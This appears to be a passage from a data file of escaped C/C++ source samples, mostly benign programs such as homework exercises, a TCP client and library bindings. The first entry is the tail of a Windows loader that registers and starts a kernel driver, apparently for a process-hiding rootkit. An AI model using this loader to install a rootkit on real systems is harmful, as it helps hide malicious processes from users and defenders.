NULL,                           // \u0411\u0443\u0444\u0435\u0440 \u0432\u044b\u0432\u043e\u0434\u0430 (\u043d\u0435 \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u0443\u0435\u0442\u0441\u044f)\n    //    0,                              // \u0420\u0430\u0437\u043c\u0435\u0440 \u0431\u0443\u0444\u0435\u0440\u0430 \u0432\u044b\u0432\u043e\u0434\u0430 (\u043d\u0435 \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u0443\u0435\u0442\u0441\u044f)\n    //    &bytesReturned,                 // \u041a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u0432\u043e\u0437\u0432\u0440\u0430\u0449\u0435\u043d\u043d\u044b\u0445 \u0431\u0430\u0439\u0442 (\u043d\u0435 \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u0443\u0435\u0442\u0441\u044f)\n    //    NULL                            // \u0423\u043a\u0430\u0437\u0430\u0442\u0435\u043b\u044c \u043d\u0430 OVERLAPPED (NULL \u0434\u043b\u044f \u0441\u0438\u043d\u0445\u0440\u043e\u043d\u043d\u043e\u0439 \u043e\u043f\u0435\u0440\u0430\u0446\u0438\u0438)\n    //);\n\n\n    //if (!call_result) {\n    //    printf(\"[-] Error sending IRP to driver: %s \\n\", \"ERORR\");\n    //    return 1;\n    //}\n\n    //printf(\"[+] IRP Sent, look for your process!\\n\");\n    //printf(\"\\nRootkit returned '%s'\\n\", retbuf);\n    return 0;\n}\n\nBOOL load_driver(SC_HANDLE svcHandle) {\n\n    printf(\"[*] Loading driver.\\n\");\n\n    // Attempt to start the service\n    if (StartService(svcHandle, 0, NULL) == 0) {\n\n        // Check if error was due to the driver already running\n        if (GetLastError() == ERROR_SERVICE_ALREADY_RUNNING) {\n\n            printf(\"[!] Driver is already running.\\n\");\n            return TRUE;\n\n        }\n        else {\n            printf(\"[-] Error loading driver: %s \\n\", \"ERORR\");\n            return FALSE;\n        }\n    }\n\n    printf(\"[+] Driver loaded.\\n\");\n    return TRUE;\n}\n\nHANDLE install_driver() {\n\n    // Declare variables\n    SC_HANDLE hSCManager = NULL;   // Handle for SCM Database\n    SC_HANDLE hService = NULL;     // Service handle \n    HANDLE hDevice = NULL;         // Device handle for our driver\n    /*BOOLEAN b;\n    ULONG r;*/\n\n\n    // Open a handle to the sc.exe service manager\n    hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);\n\n    // Check the return value of our handle\n    if (hSCManager == NULL) {\n        printf(\"[-] Error opening handle to SCM Database: %s \\n\", \"ERORR\");\n        goto cleanup;\n    }\n\n    printf(\"[*] Grabbing driver device handle...\\n\");\n\n    // Try to open a handle to our service\n    hService = OpenService(hSCManager, TEXT(SERVICE), SERVICE_ALL_ACCESS);\n\n    // If it doesn't open successfully, try to create it as a new service\n    if (hService == NULL) {\n\n\n        printf(\"[!] Doesn't exist, installing new SCM entry...\\n\");\n\n        // Check if it's because it isn't already installed\n        if (GetLastError() == ERROR_SERVICE_DOES_NOT_EXIST) {\n\n            // Create the service\n            hService = CreateService\n            (\n                hSCManager,\n                TEXT(SERVICE),\n                TEXT(SERVICE),\n                SC_MANAGER_ALL_ACCESS,\n                SERVICE_KERNEL_DRIVER,\n                SERVICE_DEMAND_START,\n                SERVICE_ERROR_IGNORE,\n                TEXT(DRIVER),\n                NULL, NULL, NULL, NULL, NULL\n            );\n\n            if (hService == NULL) {\n                printf(\"[-] Error creating service: %s \\n\", \"ERORR\");\n                goto cleanup;\n            }\n\n        }\n        else {\n            printf(\"[-] Error opening service: %s \\n\", \"ERORR\");\n            goto cleanup;\n        }\n\n        printf(\"[+] SCM database entry added.\\n\");\n\n    ",
    "#include <iostream>\r\n#include <string>\r\nusing namespace std;\r\n\r\nclass String {\r\npublic:\r\n\tchar* buffer = nullptr;\r\n\tsize_t size = 0; \r\npublic:\r\n\tString() {\r\n\t\tcout << \"Constructed empty buffer\" << endl;\r\n\t}\r\n\t\r\n\tString(const char *str) {\r\n\t\tsize = strlen(str);\r\n\t\tbuffer = new char[size + 1];\r\n\t\tstrcpy_s(buffer, size+1, str);\r\n\t\tcout << \"constructed buffer \" << buffer << endl;\r\n\t}\r\n\r\n\tString(const String& other) {\r\n\t\tsize = other.size;\r\n\t\tbuffer = new char[size + 1];\r\n\t\tstrcpy_s(buffer, size + 1, other.buffer);\r\n\t\tcout << \"copied buffer \" << buffer << endl;\r\n\t}\r\n\r\n\t~String() {\r\n\t\tif (buffer != nullptr) {\r\n\t\t\tcout << \"destroying buffer \" << buffer << endl;\r\n\t\t\tdelete[] buffer;\r\n\t\t}\r\n\t}\r\n\r\n\tchar* getBuffer() const{\r\n\t\treturn buffer;\r\n\t}\r\n\r\n\tchar& operator[](int index) {\r\n\t\tif (index >= 0 && index < size) {\r\n\t\t\treturn buffer[index];\r\n\t\t}\r\n\t}\r\n\r\n\tString& operator=(const char* str){\r\n\t\tif (buffer != nullptr) {\r\n\t\t\tcout << \"destroying buffer \" << buffer;\r\n\t\t\tdelete[] buffer;\r\n\t\t}\r\n\t\tsize = strlen(str);\r\n\t\tbuffer = new char[size + 1];\r\n\t\tstrcpy_s(buffer, size + 1, str);\r\n\t\treturn *this;\r\n\t}\r\n\r\n\tString& operator=(const String& other) {\r\n\t\tif (buffer != nullptr) {\r\n\t\t\tcout << \"destroying buffer \" << buffer;\r\n\t\t\tdelete[] buffer;\r\n\t\t}\r\n\t\tsize = other.size;\r\n\t\tbuffer = new char[size + 1];\r\n\t\tstrcpy_s(buffer, size + 1, other.buffer);\r\n\t\tcout << \"copied buffer \" << buffer << endl;\r\n\t\treturn *this;\r\n\t}\r\n};\r\n\r\nostream& operator<<(ostream& stream, const String& string) {\r\n\tstream << string.getBuffer();\r\n\treturn stream;\r\n}\r\n\r\nint main() {\r\n\t/* // Caso 1: Construtor de char*\r\n\tString s = \"Breno\";\r\n\tcout << s << endl;*/\r\n\r\n\t/*// Caso 2: Construtor de c\u00f3pia\r\n\tString s = \"Breno\";\r\n\tString t = s;\r\n\tcout << s << endl;\r\n\tcout << t << endl;*/\r\n\r\n\t// Caso 3: operator= com const char*\r\n\t/*String s = \"ababa\";\r\n\ts = \"Breno\";*/\r\n\r\n\t// Caso 4: operator= com String\r\n\t/*String s = \"Breno\";\r\n\tString t = \"Creno\";\r\n\tt = s;\r\n\tcout << t;*/\r\n\r\n\r\n\t\r\n}",
    "#include <string>\n#include <stdexcept>\n#include <sstream>\n#include <iostream>\n#include <iomanip>\n#include <stdlib.h>\n#include <assert.h>\n#include <stdarg.h>\n#include <thread>\n#include <chrono>\n#include \"calcwit.hpp\"\n#include \"utils.hpp\"\n\nusing namespace std::chrono_literals;\n\nCircom_CalcWit::Circom_CalcWit(Circom_Circuit *aCircuit) {\n    circuit = aCircuit;\n\n    signalAssigned = new bool[circuit->NSignals];\n    signalAssigned[0] = true;\n\n    mutexes = new std::mutex[NMUTEXES];\n    cvs = new std::condition_variable[NMUTEXES];\n    inputSignalsToTrigger = new int[circuit->NComponents];\n    signalValues = new FrElement[circuit->NSignals];\n\n    // Set one signal\n    Fr_copy(&signalValues[0], circuit->constants + 1);\n\n    reset();\n}\n\n\nCircom_CalcWit::~Circom_CalcWit() {\n\n    delete signalAssigned;\n\n    delete[] cvs;\n    delete[] mutexes;\n\n    delete[] signalValues;\n    delete[] inputSignalsToTrigger;\n\n}\n\nvoid Circom_CalcWit::syncPrintf(const char *format, ...) {\n    va_list args;\n    va_start(args, format);\n\n    printf_mutex.lock();\n    vprintf(format, args);\n    printf_mutex.unlock();\n\n    va_end(args);\n}\n\nvoid Circom_CalcWit::reset() {\n\n    #pragma omp parallel for\n    for (int i=1; i<circuit->NSignals; i++) {\n        signalAssigned[i] = false;\n    }\n\n    #pragma omp parallel for\n    for (int i=0; i<circuit->NComponents; i++) {\n        inputSignalsToTrigger[i] = circuit->components[i].inputSignals;\n    }\n\n    for (int i=0; i<circuit->NComponents; i++) {\n        if (inputSignalsToTrigger[i] == 0) triggerComponent(i);\n    }\n}\n\n\nint Circom_CalcWit::getSubComponentOffset(int cIdx, u64 hash) {\n    int hIdx;\n    for(hIdx = int(hash & 0xFF); hash!=circuit->components[cIdx].hashTable[hIdx].hash; hIdx++) {\n        if (!circuit->components[cIdx].hashTable[hIdx].hash) throw std::runtime_error(\"hash not found: \" + int_to_hex(hash));\n    }\n    int entryPos = circuit->components[cIdx].hashTable[hIdx].pos;\n    if (circuit->components[cIdx].entries[entryPos].type != _typeComponent) {\n        throw std::runtime_error(\"invalid type\");\n    }\n    return circuit->components[cIdx].entries[entryPos].offset;\n}\n\n\nCircom_Sizes Circom_CalcWit::getSubComponentSizes(int cIdx, u64 hash) {\n    int hIdx;\n    for(hIdx = int(hash & 0xFF); hash!=circuit->components[cIdx].hashTable[hIdx].hash; hIdx++) {\n        if (!circuit->components[cIdx].hashTable[hIdx].hash) throw std::runtime_error(\"hash not found: \" + int_to_hex(hash));\n    }\n    int entryPos = circuit->components[cIdx].hashTable[hIdx].pos;\n    if (circuit->components[cIdx].entries[entryPos].type != _typeComponent) {\n        throw std::runtime_error(\"invalid type\");\n    }\n    return circuit->components[cIdx].entries[entryPos].sizes;\n}\n\nint Circom_CalcWit::getSignalOffset(int cIdx, u64 hash) {\n    int hIdx;\n    for(hIdx = int(hash & 0xFF); hash!=circuit->components[cIdx].hashTable[hIdx].hash; hIdx++) {\n        if (!circuit->components[cIdx].hashTable[hIdx].hash) throw std::runtime_error(\"hash not found: \" + int_to_hex(hash));\n    }\n    int entryPos = circuit->components[cIdx].hashTable[hIdx].pos;\n    if (circuit->components[cIdx].entries[entryPos].type != _typeSignal) {\n        throw std::runtime_error(\"invalid type\");\n    }\n    return circuit->components[cIdx].entries[entryPos].offset;\n}\n\nCircom_Sizes Circom_CalcWit::getSignalSizes(int cIdx, u64 hash) {\n    int hIdx;\n    for(hIdx = int(hash & 0xFF); hash!=circuit->components[cIdx].hashTable[hIdx].hash; hIdx++) {\n        if (!circuit->components[cIdx].hashTable[hIdx].hash) throw std::runtime_error(\"hash not found: \" + int_to_hex(hash));\n    }\n    int entryPos = circuit->components[cIdx].hashTable[hIdx].pos;\n    if (circuit->components[cIdx].entries[entryPos].type != _typeSignal) {\n        throw std::runtime_error(\"invalid type\");\n    }\n    return circuit->components[cIdx].entries[entryPos].sizes;\n}\n\nvoid Circom_CalcWit::getSignal(int currentComponentIdx, int cIdx, int sIdx, PFrElement value) {\n    // char *s = Fr_element2str(value);\n    // syncPrintf(\"getSignal: %d %s\\n\", sIdx, s);\n    // delete s;\n    if ((circuit->components[cIdx].newThread)&&(currentComponentIdx != cIdx)) {\n        std::unique_lock<std::mutex> lk(mutexes[cIdx % NMUTEXES]);\n        while (!signalAssigned[sIdx]) {\n            cvs[sIdx % NMUTEXES].wait_for(lk, 10ms);\n        }\n        lk.unlock();\n    }\n    if (signalAssigned[sIdx] == false) {\n        fprintf(stderr, \"Accessing a not assigned signal: %d\\n\", sIdx);\n        assert(false);\n    }\n    Fr_copy(value, signalValues + sIdx);\n    /*\n    char *valueStr = mpz_get_str(0, 10, *value);\n    syncPrintf(\"%d, Get %d --> %s\\n\", currentComponentIdx, sIdx, valueStr);\n    free(valueStr);\n    */\n}\n\nvoid Circom_CalcWit::multiGetSignal(int currentComponentIdx, int cIdx, int sIdx, PFrElement value, int n) {\n    for (int i=0; i<n; i++) {\n        getSignal(currentComponentIdx, cIdx, sIdx+i, value + i);\n    }\n}\n\nvoid Circom_CalcWit::finished(int cIdx) {\n    {\n        std::lock_guard<std::mutex> lk(mutexes[cIdx % NMUTEXES]);\n        inpu",
    "#include \"kernels.h\"\n#include \"pybind11_kernel_helpers.h\"\n\nnamespace {\n\npybind11::bytes create_params(\n    uint32_t q_batch_stride,\n    uint32_t k_batch_stride,\n    uint32_t v_batch_stride,\n    uint32_t o_batch_stride,\n\n    uint32_t q_row_stride,\n    uint32_t k_row_stride,\n    uint32_t v_row_stride,\n    uint32_t o_row_stride,\n\n    uint32_t q_head_stride,\n    uint32_t k_head_stride,\n    uint32_t v_head_stride,\n    uint32_t o_head_stride,\n\n    uint32_t b,\n    uint32_t h,\n    uint32_t h_k,\n    uint32_t d,\n    uint32_t d_rounded,\n    float softmax_scale,\n    float softcap,\n\n    uint32_t seqlen_q,\n    uint32_t seqlen_k,\n    uint32_t seqlen_q_rounded,\n    uint32_t seqlen_k_rounded,\n\n    int window_size_left,\n    int window_size_right,\n\n    int is_causal,\n    int is_bf16\n) {\n  return gpu_ops::PackDescriptor(gpu_ops::MHAParams{\n    q_batch_stride,\n    k_batch_stride,\n    v_batch_stride,\n    o_batch_stride,\n\n    q_row_stride,\n    k_row_stride,\n    v_row_stride,\n    o_row_stride,\n\n    q_head_stride,\n    k_head_stride,\n    v_head_stride,\n    o_head_stride,\n\n    b,\n    h,\n    h_k,\n    d,\n    d_rounded,\n    softmax_scale,\n    softcap,\n\n    seqlen_q,\n    seqlen_k,\n    seqlen_q_rounded,\n    seqlen_k_rounded,\n\n    window_size_left,\n    window_size_right,\n\n    is_causal,\n    is_bf16\n  });\n}\n\n\npybind11::dict FlashAttnRegistrations() {\n  pybind11::dict dict;\n  dict[\"run_mha_fwd\"] =\n      gpu_ops::EncapsulateFunction(gpu_ops::run_mha_fwd_j);\n  dict[\"run_mha_bwd\"] =\n      gpu_ops::EncapsulateFunction(gpu_ops::run_mha_bwd_j);\n  return dict;\n}\n\nPYBIND11_MODULE(_jax_flash_attn, m) {\n  m.def(\"get_flash_attn_registrations\", &FlashAttnRegistrations);\n  m.def(\"create_params\", create_params);\n}\n} // namespace\n",
    "// Author: Aleksander Rodriguez\r\n// Course: COSC 2436\r\n// Program Set 3\r\n// References: https://www.techiedelight.com/insertion-in-bst/  Was used to create a binary tree using a struct\r\n//https://www.geeksforgeeks.org/check-if-two-trees-have-same-structure/amp/ Used to see if the trees are the same \r\n\r\n#include <iostream>\r\n#include <vector>\r\n#include <string>\r\nusing namespace std;\r\n\r\n// Data structure to store a BST node\r\nstruct Node\r\n{\r\n\tint data;\r\n\tNode* left = nullptr, * right = nullptr;\r\n\r\n\tNode() {}\r\n\tNode(int data) : data(data) {}\r\n};\r\n\r\n// Function to perform inorder traversal on the tree\r\n\r\n\r\n// Recursive function to insert a key into a BST using a reference parameter\r\n// call as insert(root, key);\r\nvoid insert(Node*& root, int key)\r\n{\r\n\t// if the root is null, create a new node and return it\r\n\tif (root == nullptr)\r\n\t{\r\n\t\troot = new Node(key);\r\n\t\treturn;\r\n\t}\r\n\r\n\t// if the given key is less than the root node, recur for the left subtree;\r\n\t// otherwise, recur for the right subtree\r\n\tif (key < root->data) {\r\n\t\tinsert(root->left, key);\r\n\t}\r\n\t// key >= root->data\r\n\telse {\r\n\t\tinsert(root->right, key);\r\n\t}\r\n}\r\n\r\n// Function to construct a BST from given keys\r\nNode* constructBST(vector<int> const& keys)\r\n{\r\n\tNode* root = nullptr;\r\n\tfor (int key : keys) {\r\n\t\tinsert(root, key);\r\n\t}\r\n\treturn root;\r\n}\r\n\r\n\r\nint isSameStructure(Node* a, Node* b)\r\n{\r\n\r\n\t// 1. both empty \r\n\r\n\tif (a == NULL && b == NULL)\r\n\r\n\t\treturn 1;\r\n\r\n\t// 2. both non-empty -> compare them \r\n\r\n\tif (a != NULL && b != NULL)\r\n\r\n\t{\r\n\r\n\t\treturn\r\n\r\n\t\t\t(isSameStructure(a->left, b->left) &&\r\n\r\n\t\t\t\tisSameStructure(a->right, b->right));\r\n\r\n\t}\r\n\r\n\t// 3. one empty, one not -> false \r\n\r\n\treturn 0;\r\n}\r\n\r\nint main()\r\n{\r\n\tchar yes = 'y';\r\n\tint insertNum = 0;\r\n\tint Case = 0;\r\n\tstring tree1;\r\n\tstring tempTree;\r\n\tstring tree2;\r\n\tstring tempTree2;\r\n\tdo {\r\n\r\n\t\tif (Case >= 1)\r\n\t\t{\r\n\t\t\tcin.ignore();\r\n\t\t}\r\n\t\tCase++;\r\n\t\tvector<int> keys;\r\n\t\tvector<int> keys2;\r\n\t\t\r\n\r\n\t\tcout << \"Enter tree 1: \";\r\n\t\tgetline(cin, tree1);\r\n\t\tcout << \"Enter tree 2: \";\r\n\t\tgetline(cin, tree2);\r\n\r\n\t\t// turns string into int values for the binary tree 1\r\n\t\tfor (int x = 0; x < tree1.size(); x++)\r\n\t\t{\r\n\t\t\tif ((tree1[x] >= '1' && tree1[x] <= '9') || tree1[x] <= '0')\r\n\t\t\t{\r\n\t\t\t\ttempTree += tree1[x];\r\n\t\t\t}\r\n\r\n\t\t\tif (tree1[x] == ' ' || (x + 1) == tree1.size())\r\n\t\t\t{\r\n\t\t\t\t\r\n\r\n\t\t\t\tinsertNum = stoi(tempTree);\r\n\t\t\t\tkeys.push_back(insertNum);\r\n\r\n\t\t\t\ttempTree.clear();\r\n\t\t\t}\r\n\t\t}\r\n\t\t// turns string into int values for the binary tree 2\r\n\t\tfor (int x = 0; x < tree2.size(); x++)\r\n\t\t{\r\n\t\t\tif ((tree2[x] >= '1' && tree2[x] <= '9') || tree2[x] <= '0')\r\n\t\t\t{\r\n\t\t\t\ttempTree += tree2[x];\r\n\t\t\t}\r\n\r\n\t\t\tif (tree2[x] == ' ' || (x + 1) == tree2.size())\r\n\t\t\t{\r\n\r\n\r\n\t\t\t\tinsertNum = stoi(tempTree);\r\n\t\t\t\tkeys2.push_back(insertNum);\r\n\r\n\t\t\t\ttempTree.clear();\r\n\t\t\t}\r\n\t\t}\r\n\r\n\r\n\t\t// send the keys to for each tree \r\n\t\tNode* root = constructBST(keys);\r\n\t\tNode* root2 = constructBST(keys2);\r\n\r\n\t\t\r\n\t\tcout << endl;\r\n\t\t\r\n\t\t// if the are the same the if statment will output \"Same Stucture.\" otherwise \"Not Same Structure.\r\n\t\tif (isSameStructure(root, root2))\r\n\t\t\tcout << \"Same structure.\" << endl;\r\n\r\n\t\telse\r\n\t\t\tcout << \"Not same structure.\" << endl;\r\n\r\n\t\tcout << endl << \"Run Again (Y/N): \";\r\n\t\tcin >> yes;\r\n\t\tcout << endl << endl;\r\n\r\n\t} while (yes == 'Y' || yes == 'y');\r\n\treturn 0;\r\n}",
    "#include <iostream>\n#include <filesystem>\n#include <fstream>\n#include <string>\n#include <vector>\n#include <sysexits.h>\n\nnamespace zort {\n\nconst std::string PROGRAM = \"zort\";\n\nconst int MINIMUM_ARGUMENT_COUNT = 2;\n\nvoid write_usage() {\n  std::cerr << \"Usage: \" << PROGRAM << \" [file ...]\" << std::endl;\n}\n\nstd::vector<std::string_view> parse_file_paths(const int argc, char *argv[]) {\n  std::vector<std::string_view> file_paths;\n\n  for (int i = 1; i < argc; ++i) {\n    const std::string_view argument(argv[i]);\n    if (argument.starts_with('-')) {\n      break;\n    }\n    file_paths.emplace_back(argument);\n  }\n\n  return file_paths;\n}\n\nbool check_file_paths_exist(const std::vector<std::string_view> &file_paths) {\n  for (const auto &file_path : file_paths) {\n    if (!std::filesystem::exists(file_path)) {\n      std::cerr << PROGRAM << \": No such file (\" << file_path << \")\" << std::endl;\n      return false;\n    }\n  }\n\n  return true;\n}\n\nstd::tuple<bool, std::vector<std::string>> read_lines(const std::vector<std::string_view> &file_paths) {\n  std::vector<std::string> lines;\n\n  for (const auto &file_path : file_paths) {\n    std::ifstream file(file_path);\n    if (!file) {\n      std::cerr << PROGRAM << \": Unable to open file (\" << file_path << \")\" << std::endl;\n      return {false, lines};\n    }\n\n    std::string line;\n    while (std::getline(file, line)) {\n      lines.emplace_back(line);\n    }\n\n    file.close();\n  }\n\n  return {true, lines};\n}\n}\n\nint main(int argc, char *argv[]) {\n  if (argc < zort::MINIMUM_ARGUMENT_COUNT) {\n    zort::write_usage();\n    return EX_USAGE;\n  }\n\n  const auto file_paths = zort::parse_file_paths(argc, argv);\n  if (file_paths.empty()) {\n    zort::write_usage();\n    return EX_USAGE;\n  }\n\n  if (!zort::check_file_paths_exist(file_paths)) {\n    return EX_NOINPUT;\n  }\n\n  const auto [lines_ok, lines] = zort::read_lines(file_paths);\n  if (!lines_ok) {\n    return EX_IOERR;\n  }\n\n  if (lines.empty()) {\n    std::clog << zort::PROGRAM << \": No lines to process\" << std::endl;\n    return EX_OK;\n  }\n\n  for (const auto &line : lines) {\n    std::cout << line << std::endl;\n  }\n\n  return EX_OK;\n}\n",
    "#include<iostream>\r\n#include<cctype>\r\n\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\n\tchar ch;\r\n\tdouble startBal, annRate; //user initial inputs\r\n\tdouble monWithdrawal1, monWithdrawal2, monWithdrawal3, monthDep1, monthDep2, monthDep3; // user monthly inputs\r\n\tdouble monthRate, monthDividend1 = 0, monthendBal1 = 0, balanceSum1, monthDividend2 = 0, monthendBal2 = 0, balanceSum2, monthDividend3 = 0, monthendBal3 = 0, balanceSum3; //calculated variables\r\n\tdouble quartBal, quartDep, quartWithdrawal, quartInterest; //calculated quarterly amounts\r\n\r\n\tcout << \"Enter starting balance? \" << endl;\r\n\tcin >> startBal;\r\n\tcout << \"Enter annual percentage rate? \" << endl;\r\n\tcin >> annRate;\r\n\tmonthRate = annRate / 12;\r\n\t\r\n\tcout << \"Total monthly deposit amount for month 1? \" << endl;\r\n\tcin >> monthDep1;\r\n\r\n\tbalanceSum1 = monthDep1 + startBal;\r\n\r\n\tif (monthDep1 != 0)\r\n\t{\r\n\t\tcout << \"Total monthly withdrawal amount? \" << endl;\r\n\t\tcin >> monWithdrawal1;\r\n\r\n\t\tif (monWithdrawal1 != 0 && monWithdrawal1 < balanceSum1)\r\n\t\t{\r\n\t\t\tmonthDividend1 = monthRate * (balanceSum1 -= monWithdrawal1);\r\n\t\t\tmonthendBal1 = balanceSum1 + monthDividend1;\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\tcout << \"Verify input\" << endl;\r\n\t\t}\r\n\t}\r\n\telse\r\n\t{\r\n\t\tcout << \"Enter positive number\" << endl;\r\n\t}\r\n\tcout << \"Total monthly deposit amount for month 2? \" << endl;\r\n\tcin >> monthDep2;\r\n\tbalanceSum2 = monthDep2 + monthendBal2;\r\n\tif (monthDep2 != 0)\r\n\t{\r\n\t\tcout << \"Total monthly withdrawal amount?\" << endl;\r\n\t\tcin >> monWithdrawal2;\r\n\r\n\t\tif (monWithdrawal2 != 0 && monWithdrawal2 < balanceSum2)\r\n\t\t{\r\n\t\t\tmonthDividend2 = monthRate * (balanceSum2 -= monWithdrawal2);\r\n\t\t\tmonthendBal2 = balanceSum2 + monthDividend2;\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\tcout << \"Verify input\" << endl;\r\n\t\t}\r\n\t}\r\n\telse\r\n\t{\r\n\t\tcout << \"Enter a positive number\" << endl;\r\n\t}\r\n\tcout << \"Total monthly deposit amount for month 3? \" << endl;\r\n\tcin >> monthDep3;\r\n\r\n\tbalanceSum3 = monthDep3 + monthendBal2;\r\n\tif (monthDep3 != 0)\r\n\t{\r\n\t\tcout << \"Total monthly withdrawal amount?\" << endl;\r\n\t\tcin >> monWithdrawal3;\r\n\r\n\t\tif (monWithdrawal3 != 0 && monWithdrawal3 < balanceSum3)\r\n\t\t{\r\n\t\t\tmonthDividend3 = monthRate * (balanceSum3 -= monWithdrawal3);\r\n\t\t\tmonthendBal3 = balanceSum3 + monthDividend3;\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\tcout << \"Verify input\" << endl;\r\n\t\t}\r\n\t}\r\n\telse\r\n\t{\r\n\t\tcout << \"Enter a positive number\" << endl;\r\n\t}\r\n\tquartDep = monthDep1 + monthDep2 + monthDep3;\r\n\tquartWithdrawal = monWithdrawal1 + monWithdrawal2 + monWithdrawal3;\r\n\tquartInterest = monthDividend1 + monthDividend2 + monthDividend3;\r\n\tquartBal = quartDep - quartWithdrawal + quartInterest;\r\n\tcout << endl;\r\n\tcout << \"\\nStarting Balance $\" << startBal << endl;\r\n\tcout << \"\\nTotalquarterly deposits $\" << quartDep << endl;\r\n\tcout << \"\\nTotal quarterly withdrawal $\" << quartWithdrawal << endl;\r\n\tcout << \"\\nFinal balance $\" << quartBal + startBal << endl;\r\n\r\n\tcin.get(ch);\r\n\tcout << endl;\r\n\tcin.get(ch);\r\n\r\n\treturn 0;\r\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_week11\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "// \u7f51\u7edc\u901a\u8baf\u7684\u5ba2\u6237\u7aef\u7a0b\u5e8f\u3002\n#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <errno.h>\n#include <string.h>\n#include <netinet/in.h>\n#include <sys/socket.h>\n#include <arpa/inet.h>\n#include <time.h>\n\nint main(int argc, char *argv[])\n{\n    if (argc != 3)\n    {\n        printf(\"usage:./client ip port\\n\"); \n        printf(\"example:./client 192.168.150.128 5085\\n\\n\"); \n        return -1;\n    }\n\n    int sockfd;\n    struct sockaddr_in servaddr;\n    char buf[1024];\n \n    if ((sockfd=socket(AF_INET,SOCK_STREAM,0))<0) { printf(\"socket() failed.\\n\"); return -1; }\n    \n    memset(&servaddr,0,sizeof(servaddr));\n    servaddr.sin_family=AF_INET;\n    servaddr.sin_port=htons(atoi(argv[2]));\n    servaddr.sin_addr.s_addr=inet_addr(argv[1]);\n\n    if (connect(sockfd, (struct sockaddr *)&servaddr,sizeof(servaddr)) != 0)\n    {\n        printf(\"connect(%s:%s) failed.\\n\",argv[1],argv[2]); close(sockfd);  return -1;\n    }\n\n    printf(\"connect ok.\\n\");\n    // printf(\"\u5f00\u59cb\u65f6\u95f4\uff1a%d\",time(0));\n\n    for (int ii=0;ii<200000;ii++)\n    {\n        // \u4ece\u547d\u4ee4\u884c\u8f93\u5165\u5185\u5bb9\u3002\n        memset(buf,0,sizeof(buf));\n        printf(\"please input:\"); scanf(\"%s\",buf);\n\n        if (send(sockfd,buf,strlen(buf),0) <=0)       // \u628a\u547d\u4ee4\u884c\u8f93\u5165\u7684\u5185\u5bb9\u53d1\u9001\u7ed9\u670d\u52a1\u7aef\u3002\n        { \n            printf(\"write() failed.\\n\");  close(sockfd);  return -1;\n        }\n        \n        memset(buf,0,sizeof(buf));\n        if (recv(sockfd,buf,sizeof(buf),0) <=0)      // \u63a5\u6536\u670d\u52a1\u7aef\u7684\u56de\u5e94\u3002\n        { \n            printf(\"read() failed.\\n\");  close(sockfd);  return -1;\n        }\n\n        printf(\"recv:%s\\n\",buf);\n    }\n\n    // printf(\"\u7ed3\u675f\u65f6\u95f4\uff1a%d\",time(0));\n} ",
    "#include <iostream>\r\n#include <cstring>\r\n#include <cctype>\r\n#include <vector>\r\nusing namespace std;\r\n\r\nstruct WordCount {\r\n    char word[100];\r\n    int count;\r\n};\r\n\r\nint findWordIndex(const vector<WordCount>& words, const string& word) {\r\n    for (int i = 0; i < words.size(); ++i)\r\n        if (strcmp(words[i].word, word.c_str()) == 0) \r\n            return i;\r\n    return -1;\r\n}\r\n\r\nint main() {\r\n    char paragraph[10000];\r\n    vector<WordCount> wordCounts;\r\n    cout << \"Enter a paragraph:\\n\";\r\n    cin.getline(paragraph, sizeof(paragraph));\r\n    char* token = strtok(paragraph, \" \\n\\t\");\r\n    while (token) {\r\n        for (char* p = token; *p; ++p) \r\n            *p = tolower(*p);\r\n        int index = findWordIndex(wordCounts, token);\r\n        if (index == -1) {\r\n            WordCount wc;\r\n            strncpy(wc.word, token, sizeof(wc.word) - 1);\r\n            wc.word[sizeof(wc.word) - 1] = '\\0';\r\n            wc.count = 1;\r\n            wordCounts.push_back(wc);\r\n        } else {\r\n            ++wordCounts[index].count;\r\n        }\r\n        token = strtok(NULL, \" \\n\\t\");\r\n    }\r\n    cout << \"Word frequencies:\\n\";\r\n    for (const auto& wc : wordCounts)\r\n        cout << wc.word << \": \" << wc.count << endl;\r\n    return 0;\r\n}\r\n",
